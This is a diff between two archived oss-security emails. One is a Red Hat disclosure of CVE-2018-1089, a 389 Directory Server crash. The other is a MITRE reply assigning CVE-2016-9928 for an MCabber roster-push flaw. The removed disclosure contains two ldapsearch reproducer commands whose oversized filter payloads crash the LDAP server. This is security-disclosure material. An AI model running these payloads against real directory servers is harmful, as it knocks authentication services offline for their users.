@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1459" "Monday" "7" "May" "2018" "17:30:57" "+0200" "Cedric Buissart" "cbuissar@redhat.com" "<CAKG8Do7DJOj05DgTnztiM7O780z3kXmKRoeNy6yB5_Yr1Uahwg@mail.gmail.com>" "43" "[oss-security] CVE-2018-1089 389-ds-base: unauthenticated ns-slapd crash via large filter value in ldapsearch" nil nil nil "5" "2018050715:30:57" "[oss-security] CVE-2018-1089 389-ds-base: unauthenticated ns-slapd crash via large filter value in ldapsearch" (number mark "U       cbuissar@red May  7   43/1459  " thread-indent "\"[oss-security] CVE-2018-1089 389-ds-base: unauthenticated ns-slapd crash via large filter value in ldapsearch\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2228" "Sunday" "11" "December" "2016" "17:29:13" "-0500" "cve-assign@mitre.org" "cve-assign@mitre.org" "<7b789ec9b990495db739639f907b2366@imshyb02.MITRE.ORG>" "50" "[oss-security] Re: CVE Request: MCabber: remote attackers can modify the roster and intercept messages via a crafted roster-push IQ stanza" nil nil nil "12" "2016121122:29:13" "[oss-security] Re: CVE Request: MCabber: remote attackers can modify the roster and intercept messages via a crafted roster-push IQ stanza" (number mark "U       cve-assign@m Dec 11   50/2228  " thread-indent "\"[oss-security] Re: CVE Request: MCabber: remote attackers can modify the roster and intercept messages via a crafted roster-push IQ stanza\"\n") "<20161209201906.ltauap7fydkc62f6@eldamar.local>" ("<20161209201906.ltauap7fydkc62f6@eldamar.local>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 26061 invoked by uid 550); 7 May 2018 15:31:31 -0000
+Received: (qmail 19949 invoked by uid 550); 11 Dec 2016 22:29:26 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,71 +12,64 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 26012 invoked from network); 7 May 2018 15:31:30 -0000
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=rpfD76LCCldR6iflWaIEL+Fv6qS1Biv7+rDq1QeRRbs=;
-        b=KT8Bztg7MUdBFLxONRlBV7nQiCwNbME10epicWkfT0rQ5nBsiJrZk54VdCpf+vamSd
-         Hx0YyUyFumw06BLYEVEDXhRhPV5r+3L0ZY/OGT5F8i8rfkjfXzqio5rsUn65SRC2gV/Y
-         C4F/UaW5lRFP4KmMKSZ1e4pSBWYh9XBhrYuPCtqdicoKR7p9l3jxzbPPdocsTiSvokzx
-         o3h2q1EPyDb5XTcv/egPwe+8UgnKULMvKEweCTCLXG0LX+rx3kIcqmlDzibsEFX4UYtA
-         0t2hnfhWYocR6raF92RSnh0c3lOGz3EWNdylcOIpnlD2mW/qRL9mHkPToU1HnQVzenSm
-         khZQ==
-X-Gm-Message-State: ALQs6tDqDD9qXKNa/VTkLsyYafNP4KB8y8l31rGFrvHH1vXEXVXBMvQA
-	WrMfnSnmRwZbBthYy0LAXoywsw8r7dylMjw4sLjHRjQY
-X-Google-Smtp-Source: AB8JxZqoO6vjuUr3NEDLQNut5Cxb6wC5eoJo89fJYOm7FTXZ0qGr3qIHhQ2L5nKJtZyTleBboiMBmC5hbGUE9bT0aKQ=
-X-Received: by 2002:a6b:6f0a:: with SMTP id k10-v6mr41847325ioc.93.1525707078450;
- Mon, 07 May 2018 08:31:18 -0700 (PDT)
+Received: (qmail 19930 invoked from network); 11 Dec 2016 22:29:25 -0000
+From: <cve-assign@mitre.org>
+To: <carnil@debian.org>
+CC: <cve-assign@mitre.org>, <oss-security@lists.openwall.com>
+In-Reply-To: <20161209201906.ltauap7fydkc62f6@eldamar.local>
+Message-ID: <7b789ec9b990495db739639f907b2366@imshyb02.MITRE.ORG>
+Date: Sun, 11 Dec 2016 17:29:13 -0500
 MIME-Version: 1.0
-From: Cedric Buissart <cbuissar@redhat.com>
-Date: Mon, 7 May 2018 17:30:57 +0200
-Message-ID: <CAKG8Do7DJOj05DgTnztiM7O780z3kXmKRoeNy6yB5_Yr1Uahwg@mail.gmail.com>
-To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary="0000000000007154ff056b9f5c6f"
-Subject: [oss-security] CVE-2018-1089 389-ds-base: unauthenticated ns-slapd crash via large
- filter value in ldapsearch
+Content-Type: text/plain
+Subject: [oss-security] Re: CVE Request: MCabber: remote attackers can modify the roster and intercept messages via a crafted roster-push IQ stanza
 
---0000000000007154ff056b9f5c6f
-Content-Type: text/plain; charset="UTF-8"
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-Hi all,
+> Sam Whited discovered that MCabber versions 1.0.3 and before, was
+> vulnerable to an attack identical to Gajim's CVE-2015-8688 which
+> can lead to a malicious actor MITMing a conversation, or adding
+> themselves as an entity on a third parties roster (thereby granting
+> themselves the associated privileges
+> 
+> https://gultsch.de/gajim_roster_push_and_message_interception.html
+> https://bitbucket.org/McKael/mcabber-crew/commits/6e1ead98930d7dd0a520ad17c720ae4908429033/raw
+> https://bugs.debian.org/845258
 
-This is to disclose the following flaw, CVE-2018-1089 :
+Use CVE-2016-9928.
 
-389-ds-base, a.k.a 389 Directory Server, https://pagure.io/389-ds-base/,
-is a highly usable, fully featured, reliable and secure LDAP server
-implementation. It handles many of the largest LDAP deployments in the
-world.
+At present, we do not understand whether the behavior of other
+mentioned products, such as slixmpp and SleekXMPP, should be
+considered a vulnerability. If the situation is essentially "the
+product could be improved to make it less likely for third-party code
+authors to accidentally create an unsafe interaction," then typically
+a CVE ID is not required.
 
-389-ds server did not properly handle characters needed to be escaped in
-its query filter. This could result in buffer overflows, from the heap
-or the stack, on larger filters.  An unauthenticated attacker could send
-a specially crafted LDAP request and crash the server. RCE has not been
-demonstrated at this time.
+However, if (for example) there is going to be a DSA for the
+python-sleekxmpp and python3-sleekxmpp packages, then we can assign an
+ID. As far as we can tell, the python3-slixmpp* packages are not
+available in jessie, and poezio is packaged for Fedora but not for any
+Debian distribution.
 
-Red Hat would like to thank Greg Kubok for alerting us of the issue.
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-
-Reproducer1 :
-[root@server1 ~]# payload=$(printf '.*$%.0s' {1..1000})
-[root@server1 ~]# ldapsearch -h localhost -p 389 -x -b "dc=blah"
-"(&(|(telephoneNumber=*${payload}*)(uid=*${payload}*)(title=*${payload}*)(sn=*${payload}*)(ou=*${payload}*)(givenName=*${payload}*))(objectClass=posixaccount))"
-"telephoneNumber sshpubkeyfp ipaSshPubKey uid krbCanonicalName title
-loginShell uidNumber gidNumber sn homeDirectory mail krbPrincipalName
-givenName nsAccountLock"
-
-Reproducer2:
-[root@server1 ~]# perl -e 'print ".*\$" x (1400)' | ldapsearch -x -f-
-"(&(uid=%s)(objectClass=posixaccount))"
-
-
-Patch attached for versions 1.3.7 & 1.2.11
-
-Thanks!
-
--- 
-Cedric Buissart,
-Product Security
-
---0000000000007154ff056b9f5c6f--
+iQIcBAEBCAAGBQJYTdLcAAoJEHb/MwWLVhi2fMwQALgaLk/cdN/g6ETDkT9L5bQp
+hq/oRUmZtIZOVOa/qY5cVSuS30aaGwDA2SwV9KCbb7oi0G1pRGk5/HSD+i34+SVx
+Y2PH6faXAnvtbOV808IItGWS2Y4wqQXH1bEm4pwY8abLyUsraO4I0vUip3/GSImj
+vy0qSkMBI9OadLJS1LSVIProiwZlI33NqFJOF0cPaWpChJpMfoPNJdn2qUUgJR2F
+F14MgvAjK/V1bDps/tLVNn7Rxvy7d10gBBgc0DHtNNCjLQSeZVdVkv88cDO0SZga
+QeARph2MVTPNcd2GjHcubT+FHL91mgWCyz6GGQK3/qkvq7elhmHXeR+Na7LHn5VJ
+vMrrq159mJCIKto+ThHNXLDxEqSXL83vi6x4luECf4FZrqW4GN904uvp07gtGTHW
+CsQbKQXVHsjWnojcX527MkTEVeWPE9/WslSXbWixgdlN4mKbwPlbZ8dC22xmGQqm
+TiEnn2ZmJyLLirixXFGrauRxcbFQm5byURSsJd3IfNphIwyk2jU/o4nj5HqLKGWo
+xwcLstCeVoeQntVYMjapmev7CG+NYSWoB7gq+Lf9Z93hL7xE71FM11o5M4FaCjyo
+z/rkgEm4cUaJ76S7jjURtOsillPTVb13fHTR+F04B7c4aaVXvvicIR26FdEQENc8
+iggKnJPJaFpxWZK5+T7P
+=X469
+-----END PGP SIGNATURE-----
